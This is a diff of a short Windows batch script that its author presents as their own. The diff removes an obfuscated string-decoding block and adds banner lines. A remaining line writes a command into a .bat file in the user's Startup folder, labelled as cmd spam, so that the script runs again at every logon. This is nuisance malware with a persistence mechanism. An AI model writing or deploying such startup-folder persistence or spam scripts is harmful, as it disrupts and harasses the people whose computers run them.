@@ -1,15 +1,8 @@
-::this bit is not mine so im not going to take credit for it
-
-For /F "Tokens=1,* Delims=ù" %%A in ('Type "%~0" ^| Findstr  "^{eKey}"') Do Set "__Key=%%B"
-Set "Text="
-SetLocal EnableDelayedExpansion
-For %%` in (47=10=24=31,17,45;7,4=38;30;6,34;29=23;16,43;25;14,46;36,12=33=41=21;18,9,2=35;13=19,39,44;3,26,27,22=11=42=8;15;32=1;28,) Do Set "Text=!Text!!__Key:~%%`,1!"
-Echo;!Text!
-Goto :Eof
-
-{eKey}ùÝ* lwÀ  0i*#auy0eioxGbsdTbux*ash1hmly#as] 0  s *
-
-
+@echo off
+echo off
+color 3
+cls
+echo this was made by yah boi luxs
 ::this bit is
 
 echo :dumcmdspamshitidfk >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\cmd1.bat
